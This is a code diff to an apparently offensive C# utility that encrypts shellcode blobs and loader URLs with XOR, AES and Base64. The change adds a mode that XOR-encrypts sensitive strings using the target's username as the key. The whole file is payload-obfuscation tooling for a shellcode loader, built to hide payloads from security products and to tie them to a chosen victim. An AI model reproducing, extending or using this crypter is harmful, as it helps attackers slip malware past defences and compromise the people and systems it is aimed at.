@@ -1,6 +1,5 @@
 /*
 To extract PIC blob (shellcodes are position independent) from .bin files and encrypt it just like url string encryption.
-
 Compile: csc.exe /target:exe /out:encrypt.exe .\encrypt.cs
 */
 
@@ -14,16 +13,11 @@ using System.Diagnostics;
 
 class Program
 {
-	// Encryption keys:
-	public static byte[] xor_key = Encoding.UTF8.GetBytes("mysecretkeee");			// Xor key 		// change
+	// Encryption keys and Sensive string Array:
+    public static string[] string_array;
+    public static byte[] xor_key_byte;
 
-
-    public static byte[] xor_encrypted = new byte[] {};               // TO store XOR encrypted bytes
-    public static byte[] aes_encrypted = new byte[] {};               // TO store AES encrypted bytes
-    public static byte[] aes_xor_encrypted = new byte[] {};           // TO store AES->XOR encrypted bytes
-    public static string aes_xor_b64_encrypted = "";                  // TO store AES->XOR->B64 encrypted bytes
-
-	 public static bool IsControlChar(int ch)
+	public static bool IsControlChar(int ch)
     {
         return (ch > (char)0 && ch < (char)8) // (char)0 = Null char and (char)8 = Back Space
             || (ch > (char)13 && ch < (char)26); // (char)13 = Carriage Return and (char)26 = Substitute
@@ -55,20 +49,22 @@ class Program
     // =============================== Encrypting Algos ===========================
 
     // XOR Encryption: 
-    public static byte[] XOR_Encrypt(byte[] cipher)
+    public static void XOR_B64_Encrypt(byte[] cipher)
     {
     	byte[] xored = new byte[cipher.Length];
 
         for(int i = 0; i < cipher.Length; i++)
         {
-            xored[i] = (byte)(cipher[i] ^ xor_key[i % xor_key.Length]);
+            xored[i] = (byte)(cipher[i] ^ xor_key_byte[i % xor_key_byte.Length]);
         }
 
+        /*
         Console.WriteLine("\nXOR Encrypted: ");
         Console.WriteLine("-----------------\n");
-        PasteShellcode(xored);
+        */
 
-        return xored;
+        string xor_b64 = Convert.ToBase64String(xored);
+        Console.WriteLine("{0}", xor_b64);
     }
 
     // AES Encryption:
@@ -108,13 +104,25 @@ class Program
             }
         }
 
+        /*
         Console.WriteLine("\nAES Encrypted: ");
         Console.WriteLine("-----------------\n");
         PasteShellcode(encryptedBytes);
-
+		*/
         return encryptedBytes;
     }
 
+	// Encryption: AES -> b64
+    // Convertion: input (unencrypted) byte -b64-> aes_b64 byte
+    public static void AES_B64_Encrypt(byte[] cipher, byte[] saltBytes, byte[] passwordBytes)
+    {
+    	byte[] aes_byte = AES_Encrypt(cipher, saltBytes, passwordBytes);
+    	string aes_b64 = Convert.ToBase64String(aes_byte);
+
+        Console.WriteLine("\n{0}", aes_b64);
+    }
+
+    /*
     // Encryption: AES -> XOR
     // Convertion: input (unencrypted) byte -aes-> aes_byte -xor-> aes_xor_byte
     public static byte[] AES_XOR_Encrypt(byte[] cipher, byte[] saltBytes, byte[] passwordBytes)
@@ -145,6 +153,7 @@ class Program
 
         return aes_xor_b64;
     }
+    */
 
     // For debugging purposes
     public static void PasteToConsole(byte[] encrypted)
@@ -191,11 +200,20 @@ class Program
     {
         switch (output)
         {
+        	/*
             case "xor":
                 // Convertion: byte -> byte
                 xor_encrypted = XOR_Encrypt(rawshellcode);
-                
                 break;
+			*/
+            case "xor_b64":
+            	// Convertion: byte -> b64 string
+            	Console.WriteLine("\n===========================");
+                Console.WriteLine("[+] (XOR -> b64)'ed Output: ");
+                Console.WriteLine("=============================");
+            	XOR_B64_Encrypt(rawshellcode);
+            	break;
+            /*
             case "aes":
                 // Convertion: 3 number of byte streams (input, key, iv) -> byte
                 aes_encrypted = AES_Encrypt(rawshellcode, saltBytes, passwordBytes);
@@ -208,13 +226,13 @@ class Program
                 // Convertion: input byte -aes-> aes_byte -xor-> aes_xor_byte
                 aes_xor_encrypted = AES_XOR_Encrypt(rawshellcode, saltBytes, passwordBytes);
                 break;
-
-            case "aes_xor_b64":
-                Console.WriteLine("\n====================================");
-                Console.WriteLine("[+] (AES -> XOR -> b64)'ed Output: ");
-                Console.WriteLine("====================================");
+			*/
+            case "aes_b64":
+                Console.WriteLine("\n=============================");
+                Console.WriteLine("[+] (AES -> b64)'ed Output: ");
+                Console.WriteLine("===============================");
                 // Convertion: input byte -aes-> aes_byte -xor-> aes_xor_byte -b64-> aes_xor_b64_byte
-                aes_xor_b64_encrypted = AES_XOR_B64_Encrypt(rawshellcode, saltBytes, passwordBytes);
+                AES_B64_Encrypt(rawshellcode, saltBytes, passwordBytes);
                 break;
 
             default:
@@ -230,30 +248,41 @@ class Program
         Console.WriteLine("\n[+] Please feal free to make this code efficient...\n");
 
         Console.WriteLine("[>] All possible ways of usage: \n");
-        Console.WriteLine("1. encrypt.exe /file:file.bin /out:xor");
-        Console.WriteLine("2. encrypt.exe /file:file.bin /out:aes");
-        Console.WriteLine("3. encrypt.exe /file:file.bin /out:aes_xor");
-        Console.WriteLine("4. encrypt.exe /file:file.bin /out:aes_xor_b64\n");
+        //Console.WriteLine("1. encrypt.exe /file:file.bin /out:xor");
+        //Console.WriteLine("1. encrypt.exe /file:file.bin /out:xor_b64");
+        //Console.WriteLine("3. encrypt.exe /file:file.bin /out:aes");
+        //Console.WriteLine("4. encrypt.exe /file:file.bin /out:aes_xor");
+        Console.WriteLine("1. encrypt.exe /file:file.bin /out:aes_b64");
 
-        Console.WriteLine("1. encrypt.exe /shellcodeurl:<url> /out:xor");
-        Console.WriteLine("2. encrypt.exe /shellcodeurl:<url> /out:aes");
-        Console.WriteLine("3. encrypt.exe /shellcodeurl:<url> /out:aes_xor");
-        Console.WriteLine("4. encrypt.exe /shellcodeurl:<url> /out:aes_xor_b64\n");
+        //Console.WriteLine("1. encrypt.exe /shellcodeurl:<url> /out:xor");
+        //Console.WriteLine("1. encrypt.exe /shellcodeurl:<url> /out:xor_b64");
+        //Console.WriteLine("3. encrypt.exe /shellcodeurl:<url> /out:aes");
+        //Console.WriteLine("4. encrypt.exe /shellcodeurl:<url> /out:aes_xor");
+        Console.WriteLine("2. encrypt.exe /shellcodeurl:<url> /out:aes_b64");
 
-        Console.WriteLine("1. encrypt.exe /mscorliburl:<url> /out:xor");
-        Console.WriteLine("2. encrypt.exe /mscorliburl:<url> /out:aes");
-        Console.WriteLine("3. encrypt.exe /mscorliburl:<url> /out:aes_xor");
-        Console.WriteLine("4. encrypt.exe /mscorliburl:<url> /out:aes_xor_b64\n");
+        //Console.WriteLine("1. encrypt.exe /mscorliburl:<url> /out:xor");
+        //Console.WriteLine("1. encrypt.exe /mscorliburl:<url> /out:xor_b64");
+        //Console.WriteLine("3. encrypt.exe /mscorliburl:<url> /out:aes");
+        //Console.WriteLine("4. encrypt.exe /mscorliburl:<url> /out:aes_xor");
+        Console.WriteLine("3. encrypt.exe /mscorliburl:<url> /out:aes_b64");
 
-        Console.WriteLine("1. encrypt.exe /remotewriteurl:<url> /out:xor");
-        Console.WriteLine("2. encrypt.exe /remotewriteurl:<url> /out:aes");
-        Console.WriteLine("3. encrypt.exe /remotewriteurl:<url> /out:aes_xor");
-        Console.WriteLine("4. encrypt.exe /remotewriteurl:<url> /out:aes_xor_b64\n");
+        //Console.WriteLine("1. encrypt.exe /remotewriteurl:<url> /out:xor");
+        //Console.WriteLine("1. encrypt.exe /remotewriteurl:<url> /out:xor_b64");
+        //Console.WriteLine("3. encrypt.exe /remotewriteurl:<url> /out:aes");
+        //Console.WriteLine("4. encrypt.exe /remotewriteurl:<url> /out:aes_xor");
+        Console.WriteLine("4. encrypt.exe /remotewriteurl:<url> /out:aes_b64");
 
-        Console.WriteLine("1. encrypt.exe /remotereadurl:<url> /out:xor");
-        Console.WriteLine("2. encrypt.exe /remotereadurl:<url> /out:aes");
-        Console.WriteLine("3. encrypt.exe /remotereadurl:<url> /out:aes_xor");
-        Console.WriteLine("4. encrypt.exe /remotereadurl:<url> /out:aes_xor_b64\n");
+        //Console.WriteLine("1. encrypt.exe /remotereadurl:<url> /out:xor");
+        //Console.WriteLine("1. encrypt.exe /remotereadurl:<url> /out:xor_b64");
+        //Console.WriteLine("3. encrypt.exe /remotereadurl:<url> /out:aes");
+        //Console.WriteLine("4. encrypt.exe /remotereadurl:<url> /out:aes_xor");
+        Console.WriteLine("5. encrypt.exe /remotereadurl:<url> /out:aes_b64");
+
+        //Console.WriteLine("1. encrypt.exe /string:<string> /out:xor");
+        //Console.WriteLine("1. encrypt.exe /string:<string> /out:xor_b64");
+        //Console.WriteLine("3. encrypt.exe /string:<string> /out:aes");
+        //Console.WriteLine("4. encrypt.exe /string:<string> /out:aes_xor");
+        Console.WriteLine("6. encrypt.exe /string:<string1,string2,...,stringn> /xor_key:<usernameoftarget> /out:xor_b64\n");
     }
 
 	public static void Main(string[] args)
@@ -263,8 +292,10 @@ class Program
 
 		string last_3_chars = "";							// To store input file extension
 
-		//Console.WriteLine("HERE: 48");
+        string from_input = "";
+        byte[] xor_key = Encoding.UTF8.GetBytes(from_input);
 
+        Console.Write("\n");
         foreach (var argument in args)
         {  	
             var id = argument.IndexOf(':');
@@ -303,6 +334,16 @@ class Program
                 {
                     last_3_chars = arguments["/remotereadurl"].Substring(arguments["/remotereadurl"].Length-3);
                 }
+                else if(arguments.ContainsKey("/string"))
+                {
+                	string_array = arguments["/string"].Split(',');
+
+                    if(arguments.ContainsKey("/xor_key"))
+                    {
+                        string xorKey = arguments["/xor_key"];
+                        xor_key_byte = Encoding.UTF8.GetBytes(xorKey);
+                    }
+                }
             }
             else
             {
@@ -317,9 +358,9 @@ class Program
         {
             Console.WriteLine("\n[!] Please enter /out as argument");
 
-            if (!arguments.ContainsKey("/file") || !arguments.ContainsKey("/shellcodeurl") || !arguments.ContainsKey("/mscorliburl") || !arguments.ContainsKey("/remotewriteurl") || !arguments.ContainsKey("/remotereadurl"))
+            if (!arguments.ContainsKey("/file") || !arguments.ContainsKey("/shellcodeurl") || !arguments.ContainsKey("/mscorliburl") || !arguments.ContainsKey("/remotewriteurl") || !arguments.ContainsKey("/string") || !arguments.ContainsKey("/remotereadurl"))
             {
-                Console.WriteLine("[!] Please enter /file: or, /shellcodeurl: or, /mscorliburl or, /remotewriteurl or, /remotereadurl as arguments");
+                Console.WriteLine("[!] Please enter /file: or, /shellcodeurl: or, /mscorliburl or, /remotewriteurl or, /remotereadurl or, /string as arguments");
                 banner();
             }
 
@@ -328,16 +369,30 @@ class Program
         {
             Console.WriteLine("\n[!] Empty /out ");
 
-            if ((string.IsNullOrEmpty(arguments["/file"]) || (string.IsNullOrEmpty(arguments["/shellcodeurl"])) || (string.IsNullOrEmpty(arguments["/mscorliburl"])) || (string.IsNullOrEmpty(arguments["/remotewriteurl"])) || (string.IsNullOrEmpty(arguments["/remotereadurl"]))))
+            if ((string.IsNullOrEmpty(arguments["/file"]) || (string.IsNullOrEmpty(arguments["/shellcodeurl"])) || (string.IsNullOrEmpty(arguments["/mscorliburl"])) || (string.IsNullOrEmpty(arguments["/remotewriteurl"])) || (string.IsNullOrEmpty(arguments["/string"])) || (string.IsNullOrEmpty(arguments["/remotereadurl"]))))
             {
-                Console.WriteLine("\n[!] Empty input file or url parameters ");
+                Console.WriteLine("\n[!] Empty input file or url or string parameters ");
                 banner();
+            }
+        }
+        // Sensitive String Encryption
+        else if(arguments.ContainsKey("/string"))
+        {
+            if(arguments.ContainsKey("/xor_key"))
+            {
+                Console.Write("\n");
+                foreach(string i in string_array)
+                {
+                    Console.Write("Xor-Base64({0}): ", i);
+
+                    XOR_B64_Encrypt(Encoding.UTF8.GetBytes(i));
+                }
             }
         }
         // Checking last 3 characters of corresponding Value of a Key
         else if (last_3_chars != "txt" && last_3_chars != "bin" && last_3_chars != "exe")
 		{
-			Console.WriteLine("\n[!] Invalid file type. Only .txt, .bin or .exe are accepted: {0}", last_3_chars);
+            Console.WriteLine("\n[!] Invalid file type. Only .txt, .bin or .exe are accepted: {0}", last_3_chars);
             banner();
 		}
         // 1st url call: By Loader
